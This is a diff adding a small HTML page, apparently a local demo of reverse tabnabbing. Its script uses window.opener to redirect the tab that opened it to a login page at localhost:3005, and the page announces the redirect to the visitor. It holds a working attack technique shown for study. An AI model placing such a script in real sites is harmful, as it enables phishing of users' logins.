@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Malicious page</title>
+</head>
+<body>
+  <h2> Malicious Page</h2>
+  <p>
+    Look at previous tab, you have been redirected !
+  </p>
+
+  <script>
+    if (window.opener) 
+    {
+      window.opener.location = "http://localhost:3005/login";
+    }
+  </script>
+
+</body>
+</html>
